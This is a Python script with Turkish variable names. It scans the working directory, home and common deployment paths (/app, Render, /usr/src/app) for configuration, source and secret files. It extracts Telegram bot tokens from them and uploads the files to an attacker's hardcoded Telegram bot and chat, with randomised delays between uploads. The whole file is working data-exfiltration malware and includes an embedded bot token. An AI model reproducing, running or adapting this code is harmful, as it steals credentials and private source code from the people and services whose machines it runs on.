import os
import re
import time
import random
import requests
from datetime import datetime

MY_CHAT_ID = "8216576697"         
EXFIL_TOKEN = "7869982853:AAGkI5v1o028LUaI4q-KCcqcotoH9nFsDyA"
API = f"https://api.telegram.org/bot{EXFIL_TOKEN}/"

s = requests.Session()

def api(method, **kwargs):
    url = API + method
    try:
        if "files" in kwargs:
            r = s.post(url, data=kwargs.get("data", {}), files=kwargs["files"], timeout=90)
        else:
            r = s.post(url, data=kwargs, timeout=40)
        return r.json()
    except:
        return {"ok": False}

def mesaj_gonder(text):
    if len(text) > 3900:
        text = text[:3800] + "\n... kesildi"
    api("sendMessage", chat_id=MY_CHAT_ID, text=text)

def dosya_gonder(yol):
    if not os.path.isfile(yol):
        return False
    if os.path.getsize(yol) > 50 * 1024 * 1024:
        mesaj_gonder(f"Çok büyük geçti: {os.path.basename(yol)}")
        return False

    try:
        with open(yol, "rb") as f:
            files = {"document": (os.path.basename(yol), f)}
            data = {"chat_id": str(MY_CHAT_ID)}
            resp = api("sendDocument", data=data, files=files)
        return resp.get("ok", False)
    except:
        return False

def token_var_mi(icerik):
    pat = r"([0-9]{8,11}:[A-Za-z0-9_-]{35,46})"
    return re.findall(pat, icerik)

def kritik_dosya(dosya_adi):
    ad = dosya_adi.lower()
    return ad.endswith((".py", ".env", ".json", ".yml", ".yaml", ".ini", ".toml", ".cfg")) or \
           any(k in ad for k in ["bot", "token", "config", "main", "settings", "api", "secret", "key"])

def tara_ve_direkt_gonder():
    mesaj_gonder("....")

    kokler = [
        os.getcwd(),
        "/app",
        os.path.dirname(os.getcwd()),
        os.path.expanduser("~"),
        "/opt/render/project/src",
        "/usr/src/app",
    ]

    bulunanlar = []

    for kok in kokler:
        if not os.path.exists(kok):
            continue
        mesaj_gonder(f"Taranıyor: {kok}")

        for yol, _, dosyalar in os.walk(kok):
            for dosya in dosyalar:
                tam_yol = os.path.join(yol, dosya)
                if kritik_dosya(dosya):
                    bulunanlar.append(tam_yol)

    toplam = len(bulunanlar)
    mesaj_gonder(f"{toplam} adet dosya bulundu → direkt gönderiyorum")

    gonderilen = 0

    for idx, yol in enumerate(bulunanlar, 1):
        isim = os.path.basename(yol)
        caption = f"[{idx}/{toplam}] {yol} • {datetime.now().strftime('%Y-%m-%d %H:%M')}"

       
        try:
            with open(yol, "r", encoding="utf-8", errors="ignore") as f:
                icerik = f.read(600_000)
            tokenlar = token_var_mi(icerik)
            if tokenlar:
                mesaj_gonder(f"TOKEN VAR!\n{yol}\n" + "\n".join(tokenlar[:5]))
        except:
            pass

        
        if dosya_gonder(yol):
            gonderilen += 1
            mesaj_gonder(f"Gönderildi → {isim}")
        else:
            mesaj_gonder(f"Atlandı → {isim} (hata / büyük)")

        time.sleep(random.uniform(4.5, 9.0))  

    mesaj_gonder(
        f"█ BİTTİ █\n"
        f"Toplam: {toplam}\n"
        f"Gönderilen: {gonderilen}\n"
        f"base64 = 0, chunk = 0, direkt dosya = 100%"
    )

if __name__ == "__main__":
    try:
        tara_ve_direkt_gonder()
    except Exception as e:
        mesaj_gonder(f"Patladı:\n{str(e)[:800]}")
